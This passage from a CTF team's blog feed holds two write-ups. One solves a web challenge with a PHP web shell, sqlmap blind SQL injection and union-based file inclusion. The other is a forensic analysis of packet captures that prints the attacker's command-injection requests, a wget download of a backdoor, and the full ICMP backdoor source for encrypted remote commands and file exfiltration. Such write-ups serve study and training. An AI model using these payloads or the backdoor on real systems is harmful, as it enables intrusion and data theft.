<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ curl --write-out <span class="string">'%&#123;http_code&#125;'</span> --silent --output /dev/null <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php'</span></div><div class="line">200</div><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php?cmd=ls'</span></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]) &#123;</div><div class="line">  system(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</div><div class="line">  &#125;</div><div class="line">?&gt;</div><div class="line">&lt;/pre&gt;</div></pre></td></tr></table></figure>
<p>We can see we have some good and bad news we uploaded a php file with success! but our php file isn’t executing our php code and why this is happening? The admin must have configured in the apache configuration files to not run php in this specific upload folder(uploads) or it has a .htaccess inside it blocking it.  </p>
<p>Actually you could solve this challenge very easily if you uploaded a .htaccess with your own rules overwriting the original .htaccess but this wasn’t the intentional solution, after a while the admins fixed this and protected the .htaccess file so it couldn’t get overwritten, but I believe some other teams managed to solve this challenge like this.  </p>
<p>But continuing with the intentional solution, lets try to get what’s left from the notes we took before maybe we can try some sql injection?  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">$ sqlmap -u "http://tasks.ctf.com.ua:13372/index.php?country=USA" <span class="comment">--tables --threads=10 --exclude-sysdbs --dump</span></div><div class="line"><span class="comment">---</span></div><div class="line">Parameter: country (GET)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</div><div class="line">    Payload: country=USA' AND 6412=6412 AND 'lvwC'='lvwC</div><div class="line"></div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</div><div class="line">    Payload: country=USA' AND SLEEP(5) AND 'buJa'='buJa</div><div class="line"><span class="comment">---</span></div><div class="line">[16:51:04] [INFO] the back-<span class="keyword">end</span> DBMS <span class="keyword">is</span> MySQL</div><div class="line">web <span class="keyword">server</span> operating <span class="keyword">system</span>: Linux Ubuntu</div><div class="line">web application technology: Apache <span class="number">2.4</span><span class="number">.7</span>, PHP <span class="number">5.5</span><span class="number">.9</span></div><div class="line">back-<span class="keyword">end</span> DBMS: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span></div><div class="line"><span class="keyword">Database</span>: WHATAREYOUDOINGHERE</div><div class="line">[<span class="number">1</span> <span class="keyword">table</span>]</div><div class="line">+<span class="comment">-----------+</span></div><div class="line">| countries |</div><div class="line">+<span class="comment">-----------+</span></div><div class="line"><span class="keyword">Database</span>: WHATAREYOUDOINGHERE</div><div class="line"><span class="keyword">Table</span>: countries</div><div class="line">[<span class="number">10</span> entries]</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div><div class="line">| countryID | scriptPath     | countryName  |</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div><div class="line">| <span class="number">1</span>         | country/ge.php | Germany      |</div><div class="line">| <span class="number">2</span>         | country/tu.php | Turkmenistan |</div><div class="line">| <span class="number">3</span>         | country/ne.php | Netherlands  |</div><div class="line">| <span class="number">4</span>         | country/se.php | Serbia       |</div><div class="line">| <span class="number">5</span>         | country/tk.php | Turkey       |</div><div class="line">| <span class="number">6</span>         | country/fr.php | France       |</div><div class="line">| <span class="number">7</span>         | country/uk.php | UK           |</div><div class="line">| <span class="number">8</span>         | country/ru.php | Russia       |</div><div class="line">| <span class="number">9</span>         | country/us.php | USA          |</div><div class="line">| <span class="number">10</span>        | country/ca.php | Canada       |</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div></pre></td></tr></table></figure>
<p> And we got an Blind sql injection dump (Thanks you sqlmap for doing the boring part for us!), but after dumping the database we didn’t find anything special, but if we start thinking how the page is actually working behind this, we can see the admin is selecting the path to a country php file which contains the upload form and INCLUDES it on the index.php page!!!! and here is the key for this challenge! We can try to combine SQLi and LFI with a union technique injection!  </p>
<ol>
<li>Getting the column number:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># successfully shows up a upload form!</span></div><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/index.php?country=Germany\'</span> order by 1-- qqq<span class="string">'</span></div><div class="line"><span class="string"># Doest show a upload form!</span></div><div class="line"><span class="string">$ curl '</span>http://tasks.ctf.com.ua:13372/index.php?country=Germany\<span class="string">' order by 2-- qqq'</span></div></pre></td></tr></table></figure>
<ol>
<li><p>Performing union injection and include /etc/passwd:</p>
<p> <img src="https://i.imgur.com/JFXjJx1.png" alt="LFI AND SQLi"></p>
</li>
<li><p>Including our previous uploaded php script and and get remote code execution on the server!</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">"http://tasks.ctf.com.ua:13372/index.php?cmd=ls -lta&amp;country=German' union all select 'uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php' -- frhQ"</span></div><div class="line"><span class="string">"truncated html code"</span></div><div class="line">total 72</div><div class="line">drwxrwxrwx 2 1002 1002 40960 Aug 27 21:16 uploads</div><div class="line">-r--r--r-- 1 1002 1002    49 Aug 27 07:36 .htaccess</div><div class="line">drwxrwxr-x 5 1002 1002  4096 Aug 25 20:26 .</div><div class="line">-r--r--r-- 1 1002 1002    44 Aug 25 20:26 iulersiueruigfuihseruhgi.php</div><div class="line">drwxrwxr-x 4 1002 1002  4096 Aug 25 13:59 ..</div><div class="line">-r--r--r-- 1 1002 1002  1667 Jul 28 20:54 index.php</div><div class="line">drwxrwxr-x 2 1002 1002  4096 Jul 28 03:35 country</div><div class="line">drwxrwxr-x 2 1002 1002  4096 Jul 28 03:34 static</div><div class="line"><span class="string">"truncated html code"</span></div></pre></td></tr></table></figure>
<p>The flag was in the php file iulersiueruigfuihseruhgi.php:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/index.php?cmd=cat%20iulersiueruigfuihseruhgi.php&amp;country=German%27%20union%20all%20select%20%27uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php%27%20--%20frhQ'</span></div><div class="line"><span class="string">"truncated html code"</span></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="variable">$flag</span>=<span class="string">"h4ck1t&#123;<span class="variable">$QL</span>&amp;LFI=FR13ND$&#125;"</span>;</div><div class="line">?&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line"><span class="string">"truncated html code"</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;V1rus3pidem1c&lt;br&gt;web100&lt;br&gt;&lt;br&gt;Wasted&lt;br&gt;&lt;br&gt;16&lt;br&gt;&lt;br&gt;Description: Hackers created an automated site for virus attacks on t
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
    
  </entry>
  
  <entry>
    <title>[Network] Sha2017 - Abuse Mail [300]</title>
    <link href="https://teamrocketist.github.io/2017/08/07/Network-Sha2017-Abuse-Mail-300/"/>
    <id>https://teamrocketist.github.io/2017/08/07/Network-Sha2017-Abuse-Mail-300/</id>
    <published>2017-08-07T12:52:21.000Z</published>
    <updated>2017-08-10T02:49:22.370Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Abuse Mail (300) - 62 solves<br>Our abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happened. Can you help us to catch the culprit?<br><br><a href="https://ctf.sha2017.org/download?file_key=ad9dfb334a977140e0d9acb77def441e2d38f8fe97a04eeae1c1e2df249c2a09&team_key=e3d856e04ca181b6335a385d5f82cc2240f10195d682907cb54893fde801b87b" target="_blank" rel="external">abusemail.tgz</a><br><br>233b7cb7f8113baca2f8d29d74105887<br><br></blockquote>

<p>we have 3 capture files abuse00.pcap, abuse01.pcap and abuse02.pcap. Starting with abuse00.pcap we can see we have some encrypted ESP packages and some telenet communication. Let’s check telenet’s packages:<br><img alt="Telnet Packages" src="https://i.imgur.com/VAv3kd4.png" title="Telnet Packages"></p>
<p>Now we have the credentials to decrypt the ESP packages! using wireshark to decrypt them Edit -&gt; Preferences -&gt; Protocols -&gt; ESP</p>
<p><img src="https://i.imgur.com/R2dfoNH.png" title="Decrypt ESP"></p>
<p>After decrypting it we can see that the hacker used a remote command vulnerability at the GET parameter IP to  upload a backdoor on the server. the commands he used:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">GET /?ip=google.com HTTP/1.1</div><div class="line">PING google.com (172.217.17.110) 56(84) bytes of data.</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=9.12 ms</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=8.86 ms</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.3 ms</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.06 ms</div><div class="line"></div><div class="line">GET /?ip=google.com;ls HTTP/1.1</div><div class="line">ING google.com (172.217.17.110) 56(84) bytes of data.</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=8.66 ms</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=9.44 ms</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.0 ms</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.44 ms</div><div class="line"></div><div class="line">--- google.com ping statistics ---</div><div class="line">4 packets transmitted, 4 received, 0% packet loss, time 3005ms</div><div class="line">rtt min/avg/max/mdev = 8.445/9.153/10.057/0.639 ms</div><div class="line">css</div><div class="line">index.php</div><div class="line"></div><div class="line">GET /?ip=;ls%20-la HTTP/1.1</div><div class="line">total 16</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 09:36 .</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 03:45 ..</div><div class="line">drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css</div><div class="line">-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.php</div><div class="line"></div><div class="line"></div><div class="line">GET /?ip=;sudo%20<span class="_">-l</span> HTTP/1.1</div><div class="line">Matching Defaults entries <span class="keyword">for</span> www-data on router:</div><div class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</div><div class="line"></div><div class="line">User www-data may run the following commands on router:</div><div class="line">    (ALL : ALL) NOPASSWD: ALL</div><div class="line"></div><div class="line"></div><div class="line">GET /?ip=;id HTTP/1.1</div><div class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div><div class="line"></div><div class="line">GET /?ip=;wget http://10.5.5.207/backdoor.py -O /tmp/backdoor.py HTTP/1.1</div><div class="line">--2017-07-26 09:43:36--  http://10.5.5.207/backdoor.py</div><div class="line">Connecting to 10.5.5.207:80... connected.</div><div class="line">HTTP request sent, awaiting response... 200 OK</div><div class="line">Length: 2428 (2.4K) [text/x-python]</div><div class="line">Saving to: <span class="string">'/tmp/backdoor.py'</span></div><div class="line">0K ..                                                    100%  458M=0s</div><div class="line"></div><div class="line">2017-07-26 09:43:36 (458 MB/s) - <span class="string">'/tmp/backdoor.py'</span> saved [2428/2428]</div><div class="line">GET /?ip=;cat /tmp/backdoor.py HTTP/1.1</div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line">import base64</div><div class="line">import sys</div><div class="line">import time</div><div class="line">import subprocess</div><div class="line">import threading</div><div class="line"></div><div class="line">from Crypto import Random</div><div class="line">from Crypto.Cipher import AES</div><div class="line">from scapy.all import *</div><div class="line"></div><div class="line">BS = 16</div><div class="line">pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = lambda s : s[0:-ord(s[-1])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line"></div><div class="line"></div><div class="line">class AESCipher:</div><div class="line"></div><div class="line">    def __init__( self, key ):</div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    def encrypt( self, raw ):</div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().<span class="built_in">read</span>( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    def decrypt( self, enc ):</div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:16]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> unpad(cipher.decrypt( enc[16:] ))</div><div class="line"></div><div class="line">def run_command(cmd):</div><div class="line">    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[0]</div><div class="line">    <span class="built_in">return</span> output</div><div class="line"></div><div class="line">def send_ping(host, magic, data):</div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(1)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)</div><div class="line"></div><div class="line">def chunks(L, n):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, len(L), n):</div><div class="line">        yield L[i:i+n]</div><div class="line"></div><div class="line">def get_file(host, magic, fn):</div><div class="line">    time.sleep(1)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).<span class="built_in">read</span>())</div><div class="line">    cnt = 0</div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, 500):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = True</div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += 1</div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line">cipher = AESCipher(sys.argv[1])</div><div class="line"></div><div class="line"><span class="keyword">while</span> True:</div><div class="line">    try: </div><div class="line">        pkts = sniff(filter=<span class="string">"icmp"</span>, timeout =5,count=1)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> pkts:</div><div class="line">             <span class="keyword">if</span>  str(packet.getlayer(ICMP).<span class="built_in">type</span>) == <span class="string">"8"</span>: </div><div class="line">                input = packet[IP].load</div><div class="line">                <span class="keyword">if</span> input[0:len(magic)] == magic:</div><div class="line">                    input = input.split(<span class="string">":"</span>)</div><div class="line">                    data = cipher.decrypt(input[1]).split(<span class="string">":"</span>)</div><div class="line">                    ip = packet[IP].src</div><div class="line">                    <span class="keyword">if</span> data[0] == <span class="string">"command"</span>:</div><div class="line">                        output = run_command(data[1])</div><div class="line">                        send_ping(ip, magic, <span class="string">"command:&#123;&#125;"</span>.format(output))</div><div class="line">                    <span class="keyword">if</span> data[0] == <span class="string">"getfile"</span>:</div><div class="line">                        <span class="comment">#print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line">                        get_file(ip, magic, data[1])</div><div class="line">    except:</div><div class="line">        pass</div><div class="line"></div><div class="line">GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1</div></pre></td></tr></table></figure>
<p>The hacker used AES to encrypt his commands! And we know the password he used! which we can get it from the GET HTTP request! which was K8djhaIU8H2d1jNb “GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1”.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"></div><div class="line">BS = <span class="number">16</span></div><div class="line">pad = <span class="keyword">lambda</span> s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">( self, key )</span>:</span></div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">( self, raw )</span>:</span></div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().read( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">( self, enc )</span>:</span></div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:<span class="number">16</span>]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> unpad(cipher.decrypt( enc[<span class="number">16</span>:] ))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(cmd)</span>:</span></div><div class="line">    ps = subprocess.Popen(cmd,shell=<span class="keyword">True</span>,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_ping</span><span class="params">(host, magic, data)</span>:</span></div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=<span class="number">1</span>, verbose=<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span><span class="params">(L, n)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(L), n):</div><div class="line">        <span class="keyword">yield</span> L[i:i+n]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(host, magic, fn)</span>:</span></div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).read())</div><div class="line">    cnt = <span class="number">0</span></div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, <span class="number">500</span>):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = <span class="keyword">True</span></div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line">cipher = AESCipher(sys.argv[<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>: </div><div class="line">        pkts = sniff(filter=<span class="string">"icmp"</span>, timeout =<span class="number">5</span>,count=<span class="number">1</span>)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> pkts:</div><div class="line">             <span class="keyword">if</span>  str(packet.getlayer(ICMP).type) == <span class="string">"8"</span>: </div><div class="line">                input = packet[IP].load</div><div class="line">                <span class="keyword">if</span> input[<span class="number">0</span>:len(magic)] == magic:</div><div class="line">                    input = input.split(<span class="string">":"</span>)</div><div class="line">                    data = cipher.decrypt(input[<span class="number">1</span>]).split(<span class="string">":"</span>)</div><div class="line">                    ip = packet[IP].src</div><div class="line">                    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">"command"</span>:</div><div class="line">                        output = run_command(data[<span class="number">1</span>])</div><div class="line">                        send_ping(ip, magic, <span class="string">"command:&#123;&#125;"</span>.format(output))</div><div class="line">                    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">"getfile"</span>:</div><div class="line">                        <span class="comment">#print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line">                        get_file(ip, magic, data[<span class="number">1</span>])</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>With all this information we need to decrypt the packages from the other PCAPs, which contains the communication between the hacker and the server, we can use the hackers script and password! first lets extract the encrypted data with tshark!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse02.pcap -Tfields -e data | xxd -r -p &gt; encrypted1</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse03.pcap -Tfields -e data | xxd -r -p &gt; encrypted2</div></pre></td></tr></table></figure>
<p>Now modifing the scrypt so we can decrypt our IMCP encrypted data:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div 